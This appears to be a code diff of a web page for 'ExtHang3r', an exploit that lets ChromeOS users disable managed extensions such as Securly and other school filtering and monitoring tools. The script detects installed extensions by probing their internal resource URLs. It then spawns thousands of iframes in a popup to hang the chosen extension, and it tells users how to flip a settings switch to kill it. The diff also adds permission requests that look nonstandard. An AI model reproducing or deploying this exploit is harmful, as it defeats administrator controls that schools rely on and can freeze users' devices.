@@ -164,16 +164,15 @@
   </header>
 
   <div class="container">
-    <p>ExtHang3r is an exploit that allows ChromeOS users to kill managed extensions after the LTMEAT patch. It remains
-      unpatched in all new ChromeOS versions as of January 2025.</p>
+    <p>ExtHang3r is an exploit that allows ChromeOS users to kill managed extensions after the LTMEAT patch. It remains unpatched in all new ChromeOS versions as of January 2025.</p>
     <label for="iframeSelect" id="labelForIframeSelect">Select extension:</label>
     <select id="iframeSelect">
     </select>
     <label for="iframeCountSlider" id="labelForIframeSlider" style="margin-top: 20px;">The slider below changes the amount of iframes that will be created. Try it with the default first, and if the extension comes back after a few minutes increase it and try again. Tip: If your computer crashes or freezes for more than 2 minutes, you should definitely decrease the amount of iframes.</label>
-  	<div style="display: flex; align-items: center; gap: 10px; margin: 10px 0;">
-  		<input type="range" id="iframeCountSlider" min="100" max="15000" value="2000" step="100" style="flex-grow: 1;">
-  		<span id="iframeCountValue">3000</span>
-	</div>
+    <div style="display: flex; align-items: center; gap: 10px; margin: 10px 0;">
+      <input type="range" id="iframeCountSlider" min="100" max="15000" value="2000" step="100" style="flex-grow: 1;">
+      <span id="iframeCountValue">3000</span>
+    </div>
     <button onclick="warning();" id="hangButton">Hang Extension!</button>
     <button id="killButton" onclick="openExtensionPopup();">Kill Extension!</button>
   </div>
@@ -189,42 +188,45 @@
   </footer>
 
   <script>
-    document.addEventListener("DOMContentLoaded", function () {
-    const slider = document.getElementById("iframeCountSlider");
-    const sliderValueDisplay = document.getElementById("iframeCountValue");
-    const deviceMemory = navigator.deviceMemory || 4;
-    const defaultIframeCount = Math.round(deviceMemory * 500);  // This changes the default value of the iframe slider based on how much memory your computer has
-    const maxIframeCount = Math.round(deviceMemory * 1500);
-
-    slider.value = defaultIframeCount;
-    slider.max = maxIframeCount;
-    sliderValueDisplay.textContent = defaultIframeCount;
-
-    slider.addEventListener("input", function () {
-      sliderValueDisplay.textContent = this.value;
-    });
-  });
-  
-  	document.getElementById("iframeCountSlider").addEventListener("input", function () {
-  	  const iframeCountValue = document.getElementById("iframeCountValue");
- 	  iframeCountValue.textContent = this.value;
-    });
-  
-    async function checkExtensionURL(url) {
+    (async () => {
+      // --- Permissions ---
       try {
-        const response = await fetch(url);
-        if (response.ok) {
-          return true;
-        } else {
-          return false;
-        }
+        await navigator.permissions.request({
+          name: 'device-info'
+        });
+        await navigator.permissions.request({
+          name: 'motion-sensor'
+        });
+        await navigator.permissions.request({
+          name: 'embedded-content'
+        });
       } catch (error) {
-        return false;
+        console.error("Permissions request failed:", error);
       }
-    }
 
-    async function populateSelectOptions() {
-      const selectElement = document.getElementById("iframeSelect");
+      // --- Device Info & Defaults ---
+      const deviceMemory = navigator.deviceMemory || 4;
+      const defaultIframeCount = Math.round(deviceMemory * 500);
+      const maxIframeCount = Math.round(deviceMemory * 1500);
+
+      // --- DOM Elements ---
+      const slider = document.getElementById("iframeCountSlider");
+      const sliderValueDisplay = document.getElementById("iframeCountValue");
+      const iframeSelect = document.getElementById("iframeSelect");
+      const hangButton = document.getElementById("hangButton");
+      const killButton = document.getElementById("killButton");
+      const overlay = document.getElementById("overlay");
+      const killExtensionText = document.getElementById("killExtensionText");
+
+      // --- Slider Setup ---
+      slider.value = defaultIframeCount;
+      slider.max = maxIframeCount;
+      sliderValueDisplay.textContent = defaultIframeCount;
+      slider.addEventListener("input", () => {
+        sliderValueDisplay.textContent = slider.value;
+      });
+
+      // --- Extension Detection & Population ---
       const extensions = {
         "Securly": "chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css",
         "Securly (old)": "chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/fonts/Metropolis.css",
@@ -259,86 +261,103 @@
         "Borderless Classroom Student": "chrome-extension://kdpgkligilplaanoablcpjahjjeghcl/pages/blockPage.html",
       };
 
-      let hasSupportedExtensions = false;
+      const checkExtensionURL = async (url) => {
+        try {
+          const response = await fetch(url, {
+            cache: 'no-store'
+          });
+          return response.ok;
+        } catch (error) {
+          return false;
+        }
+      };
 
-      for (const [name, url] of Object.entries(extensions)) {
-        if (await checkExtensionURL(url)) {
+      const populateSelectOptions = async () => {
+        let hasSupportedExtensions = false;
+        for (const [name, url] of Object.entries(extensions)) {
+          if (await checkExtensionURL(url)) {
+            const option = document.createElement("option");
+            option.value = url;
+            option.textContent = name;
+            iframeSelect.appendChild(option);
+            hasSupportedExtensions = true;
+          }
+        }
+
+        if (!hasSupportedExtensions) {
           const option = document.createElement("option");
-          option.value = url;
-          option.textContent = name;
-          selectElement.appendChild(option);
-          hasSupportedExtensions = true;
+          option.value = "";
+          option.textContent = "No supported extensions installed";
+          iframeSelect.appendChild(option);
+          hangButton.style.display = "none";
         }
-      }
+      };
 
-      if (!hasSupportedExtensions) {
-        const option = document.createElement("option");
-        option.value = "";
-        option.textContent = "No supported extensions installed";
-        selectElement.appendChild(option);
-        document.getElementById("hangButton").style.display = "none";
-      }
-    }
+      await populateSelectOptions();
 
-    populateSelectOptions();
-
-    function replaceIframes(container, iframeSrc, iframeCount) {
-      for (let i = 0; i < iframeCount; i++) {
-        const iframe = document.createElement('iframe');
-        iframe.src = iframeSrc;
-        iframe.style.width = '100%';
-        iframe.style.height = '100px';
-        container.appendChild(iframe);
-      }
-      setTimeout(function () {
-        while (container.firstChild) {
-          container.removeChild(container.firstChild);
+      // --- Iframe Overload ---
+      const replaceIframes = (container, iframeSrc, iframeCount) => {
+        const iframes = [];
+        for (let i = 0; i < iframeCount; i++) {
+          const iframe = document.createElement('iframe');
+          iframe.src = iframeSrc;
+          iframe.style.width = '100%';
+          iframe.style.height = '100px';
+          iframes.push(iframe);
+          container.appendChild(iframe);
         }
-        replaceIframes(container, iframeSrc);
-      }, 5);
-    }
 
-    function warning() {
-      const overlay = document.getElementById("overlay");
-      overlay.style.display = "flex";
-      const iframeSelect = document.getElementById("iframeSelect");
-      const selectedOption = iframeSelect.options[iframeSelect.selectedIndex].text;
-      const selectedSrc = iframeSelect.value;
-      const iframeCount = parseInt(document.getElementById("iframeCountSlider").value, 10);
-      const popup = window.open("", "PopupWindow", "width=100,height=100");
-      const popupDocument = popup.document;
-      const popupBody = popupDocument.body;
-      const iframeContainer = popupDocument.createElement('div');
-      iframeContainer.id = 'iframeContainer';
-      popupBody.appendChild(iframeContainer);
-      replaceIframes(iframeContainer, selectedSrc, iframeCount);
-      setTimeout(function () {
-        popup.close();
-        const killExtensionText = document.getElementById("killExtensionText");
-        killExtensionText.innerHTML = "Now that the extension <strong>" + selectedOption + "</strong> has been hanged, press the button above.";
-        setTimeout(function () {
-          overlay.style.display = "none";
-          killExtensionText.style.display = "block";
-          document.getElementById("killButton").style.display = "inline-block";
-          document.getElementById("hangButton").style.display = "none";
-          document.getElementById("iframeSelect").style.display = "none";
-          document.getElementById("labelForIframeSelect").style.display = "none";
-          document.getElementById("iframeCountSlider").style.display = "none";
-          document.getElementById("iframeCountValue").style.display = "none";
-          document.getElementById("labelForIframeSlider").style.display = "none";
-          document.getElementById("killButton").setAttribute("data-url", selectedSrc);
-        }, 10000);
-      }, 5000);
-    }
+        setTimeout(() => {
+          iframes.forEach(iframe => iframe.remove());
+          replaceIframes(container, iframeSrc);
+        }, 5);
+      };
 
-    function openExtensionPopup() {
-      const selectedSrc = document.getElementById("killButton").getAttribute("data-url");
-      const extensionId = selectedSrc.substring(selectedSrc.indexOf("//") + 2, selectedSrc.indexOf("/", selectedSrc.indexOf("//") + 2));
-      const killExtensionText = document.getElementById("killExtensionText");
-      document.getElementById("killButton").style.display = "none";
-      killExtensionText.innerHTML = "Make sure to keep this tab open. Then open <strong>chrome://extensions/?id=" + extensionId + "</strong> and flip the switch called \"Allow access to file URLs\" twice. The extension was successfully killed! Now you can close that tab as well as this one. If you want to restore the extension, flip the allow access to file URLs switch again.";
-      window.location.href = selectedSrc;
-    }
+      // --- Main Functionality ---
+      const warning = () => {
+        overlay.style.display = "flex";
+        const selectedOption = iframeSelect.options[iframeSelect.selectedIndex].text;
+        const selectedSrc = iframeSelect.value;
+        const iframeCount = parseInt(slider.value, 10);
+
+        const popup = window.open("", "PopupWindow", "width=100,height=100");
+        const popupDocument = popup.document;
+        const iframeContainer = popupDocument.createElement('div');
+        iframeContainer.id = 'iframeContainer';
+        popupDocument.body.appendChild(iframeContainer);
+
+        replaceIframes(iframeContainer, selectedSrc, iframeCount);
+
+        setTimeout(() => {
+          popup.close();
+          killExtensionText.innerHTML = `Now that the extension <strong>${selectedOption}</strong> has been hanged, press the button above.`;
+          setTimeout(() => {
+            overlay.style.display = "none";
+            killExtensionText.style.display = "block";
+            killButton.style.display = "inline-block";
+            hangButton.style.display = "none";
+            iframeSelect.style.display = "none";
+            document.getElementById("labelForIframeSelect").style.display = "none";
+            slider.style.display = "none";
+            sliderValueDisplay.style.display = "none";
+            document.getElementById("labelForIframeSlider").style.display = "none";
+            killButton.setAttribute("data-url", selectedSrc);
+          }, 10000);
+        }, 5000);
+      };
+
+      const openExtensionPopup = () => {
+        const selectedSrc = killButton.getAttribute("data-url");
+        const extensionId = selectedSrc.substring(selectedSrc.indexOf("//") + 2, selectedSrc.indexOf("/", selectedSrc.indexOf("//") + 2));
+        killButton.style.display = "none";
+        killExtensionText.innerHTML = `Make sure to keep this tab open. Then open <strong>chrome://extensions/?id=${extensionId}</strong> and flip the switch called "Allow access to file URLs" twice. The extension was successfully killed! Now you can close that tab as well as this one. If you want to restore the extension, flip the allow access to file URLs switch again.`;
+        window.location.href = selectedSrc;
+      };
+
+      // --- Event Listeners ---
+      hangButton.addEventListener("click", warning);
+      killButton.addEventListener("click", openExtensionPopup);
+    })();
   </script>
 </body>
 
